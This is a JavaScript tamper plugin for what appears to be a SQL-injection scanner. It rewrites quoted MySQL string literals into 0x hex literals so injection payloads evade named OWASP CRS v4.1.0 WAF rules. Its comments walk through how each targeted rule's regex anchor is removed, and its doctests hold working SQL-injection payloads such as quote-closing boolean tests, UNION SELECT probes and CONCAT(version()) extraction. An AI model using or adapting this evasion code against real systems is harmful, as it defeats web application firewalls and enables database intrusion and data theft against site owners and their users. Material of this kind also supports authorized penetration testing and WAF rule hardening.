// 引号字符串字面量 → MySQL 十六进制字面量（类名 hexliterals）—— CRS v4.1.0 针对性变体
//
// 原理：MySQL 中 'abc' 与 0x616263 完全等价（0x 前缀是二进制字符串字面量），
// 回显、比较、拼接语义均不变；但"引号"这一字符从 payload 中消失，直接抽掉 CRS 多条规则的锚点：
//   · 942511  `'(?:[\w\s=_\-+{}()<@]{2,29})'`      —— 需要引号包裹的短字符串（UNION 列探测标记 'SQLISCANNER0' 正中）
//   · 942200  `,.*?[\"'\)0-9`-f][\"'`](?:...)`      —— 需要「逗号后的引号」
//   · 942370  `[\"'`](?:...)`                       —— 需要以引号开头
//   · 942431/942430 标点预算：每个字面量省 2 个特殊字符
//
// 与既有 quote2hex 的区别（这是它能生效、quote2hex 不能生效的关键）：
//   注入 payload 的**首个引号是「闭合符」**，其后到下一个引号之间是 SQL 代码而非字符串。
//   quote2hex 用 /'([^']*)'/g 无差别配对 → 会把 "1' UNION SELECT ' 当成字面量整体十六进制化，
//   既破坏语义也会因超长 0x 串爆掉标点预算。
//   本插件只匹配「内容全为词字符」的字面量：闭合引号后紧跟空格/运算符，天然不匹配，
//   因此无需引号状态机即可安全地区分「闭合符」与「字符串」。
const WORD_LITERAL_RE = /'([0-9A-Za-z_]+)'/g;

export const hexliterals = {
  name: 'hexliterals',
  description: "词字符字符串字面量 'abc' → 0x616263（MySQL 语义等价，消除引号以绕开 CRS 942511/942200/942370；自动跳过注入闭合引号）",
  dbms: ['MySQL', 'MariaDB'], // 0x 字面量为 MySQL/MariaDB 语法；PgSQL/Oracle/MSSQL 不适用
  // 标记安全：0x 字面量与 'xxx' 回显完全一致，不会破坏 __S__/SQLISCANNER<N> 标记语义
  markerSafe: true,
  doctests: [
    // 闭合引号 ' 后紧跟空格 → 不是「纯词字符字面量」，原样保留（这是本插件不破坏 payload 的关键）
    { input: "1' AND 'a'='a'#", output: "1' AND 0x61=0x61#" },
    // UNION 列探测标记去引号 → CRS 942511/942200 失去锚点
    { input: "1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1'", output: '1 UNION SELECT 0x53514c495343414e4e455230,0x53514c495343414e4e455231' },
    { input: "name LIKE '%alice%'", output: "name LIKE '%alice%'" }, // 含 % 非词字符 → 不转换，避免破坏 LIKE 语义
    { input: "CONCAT('__S__',version())", output: 'CONCAT(0x5f5f535f5f,version())' },
    // 纯数字字面量不转换：LIMIT '1' / 算术上下文里 0x31 不是合法整型字面量，收益也近乎为零
    { input: "1' ORDER BY '1'#", output: "1' ORDER BY '1'#" },
  ],
  /**
   * @param {string} payload 待混淆的注入串
   * @param {object} ctx 检测上下文（透传）
   * @returns {string}
   */
  transform(payload, ctx) {
    void ctx;
    const src = String(payload ?? '');
    return src.replace(WORD_LITERAL_RE, (m, body) => {
      // 纯数字字面量不转换：'1' 在数值上下文里 0x31 需隐式转换，且对绕过无增益（无引号标记场景）
      if (/^[0-9]+$/.test(body)) return m;
      return '0x' + Buffer.from(body, 'utf8').toString('hex');
    });
  },
};

export default hexliterals;
